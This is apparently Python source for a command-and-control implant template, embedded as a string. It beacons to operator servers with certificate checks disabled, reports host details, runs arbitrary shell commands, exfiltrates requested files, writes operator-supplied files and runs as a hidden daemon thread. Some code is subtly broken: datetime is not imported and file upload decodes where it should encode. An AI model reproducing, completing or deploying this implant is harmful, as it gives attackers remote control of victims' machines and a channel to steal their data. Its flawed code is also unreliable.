IMPLANT_SRC = textwrap.dedent('''\
import base64, json, os, platform, socket, ssl, subprocess, sys, threading, time, urllib.request, hashlib

AGENT_ID = "AGENT_ID"
C2_MESH  = C2_MESH
XOR_KEY  = bytes.fromhex("XOR_KEY")
BEACON   = BEACON
JITTER   = JITTER
KILL_DATE= "KILL_DATE"
FAIL_MAX = FAIL_MAX

_j = json.loads; _b = base64.b64decode; _u = urllib.request.urlopen; _r = urllib.request.Request

def _decrypt(b):
    return bytes(c ^ XOR_KEY[i % len(XOR_KEY)] for i, c in enumerate(b))

def _post(url, payload):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    req = _r(url, data=_decrypt(payload), headers={"Content-Type":"application/octet-stream","X-A":AGENT_ID})
    with _u(req, timeout=15, context=ctx) as r:
        return _decrypt(r.read())

def _host_meta():
    try: hn = socket.gethostname()
    except: hn = "unk"
    return {"agent": AGENT_ID, "host": hn, "os": platform.platform(), "uid": os.getuid() if hasattr(os, "getuid") else os.getenv("USERNAME","usr")}

def _exec(cmd):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=180)
        return (p.stdout + p.stderr).decode(errors="ignore")
    except Exception as e:
        return f"ERR: {e}"

def _check_kill_date():
    if not KILL_DATE: return False
    try:
        kd = datetime.strptime(KILL_DATE, "%Y-%m-%d").timestamp()
        return time.time() > kd
    except: pass
    return False

def loop():
    fail_count = 0
    while True:
        if _check_kill_date():
            sys.exit(0)
        if fail_count >= FAIL_MAX:
            sys.exit(0)
        for url in C2_MESH:
            try:
                msg = json.dumps({"meta": _host_meta(), "checkin": time.time()}).encode()
                raw = _post(url, msg)
                if not raw: continue
                task = _j(raw.decode())
                fail_count = 0
                if task.get("cmd") == "shell":
                    out = _exec(task["arg"])
                    _post(url, json.dumps({"agent": AGENT_ID, "out": out}).encode())
                elif task.get("cmd") == "upload":
                    path = task["path"]
                    with open(path, "rb") as f: data = f.read()
                    _post(url, json.dumps({"agent": AGENT_ID, "file": path, "data": _b(data).decode()}).encode())
                elif task.get("cmd") == "download":
                    path = task["path"]
                    data = _b(task["data"])
                    with open(path, "wb") as f: f.write(data)
                    _post(url, json.dumps({"agent": AGENT_ID, "out": f"Written {len(data)}b"}).encode())
                elif task.get("cmd") == "sleep":
                    time.sleep(int(task.get("arg", BEACON)))
                elif task.get("cmd") == "die":
                    sys.exit(0)
                break
            except Exception:
                continue
        time.sleep(BEACON + (os.urandom(1)[0] % JITTER))

threading.Thread(target=loop, daemon=True).start()
''')

